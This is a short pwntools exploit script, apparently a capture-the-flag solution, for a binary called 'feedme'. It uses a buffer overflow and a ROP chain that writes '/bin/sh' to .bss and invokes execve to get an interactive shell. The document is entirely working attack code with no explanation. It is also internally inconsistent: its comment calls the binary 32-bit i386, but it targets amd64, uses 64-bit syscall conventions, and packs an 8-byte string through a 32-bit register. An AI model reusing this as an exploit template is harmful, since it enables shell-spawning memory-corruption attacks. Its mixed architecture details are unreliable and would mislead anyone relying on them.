from pwn import *

context.arch = "amd64"
context.binary = "./feedme"
elf = ELF("./feedme")
target = process("./feedme")
bss_addr = elf.bss()

# feedme: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), statically linked, for GNU/Linux 2.6.24, stripped
# ROPgadget --binary ./feedme --only "pop|ret" | grep -E "edi|esi|edx|eax"
# 0x080bb496 : pop eax ; ret
# 0x0804846f : pop edi ; ret
# 0x0806f34a : pop edx ; ret
# 0x08049dd5 : pop esi ; ret

# ROPgadget --binary ./feedme --only "syscall"
# 0x0806328d : syscall

# ROPgadget --binary ./feedme --only "mov|ret"
# 0x0809a7ed : mov dword ptr [edx], eax ; ret

pop_edi = 0x0804846f
pop_esi = 0x08049dd5
pop_edx = 0x0806f34a
pop_eax = 0x080bb496
syscall = 0x0806328d
write_gadget = 0x0809a7ed

target_addr = elf.bss() + 0*100

padding = b"A" * (72 + 8)
payload = flat(
    padding,
    pop_edx,
    target_addr,
    pop_eax,
    b"/bin/sh\x00",
    write_gadget,
    
    pop_edi,
    target_addr,
    pop_esi,
    0,
    pop_edx,
    0,
    pop_eax,
    0x3b,
    syscall
)

target.sendlineafter(b"FEED ME!\n", payload)
target.interactive()
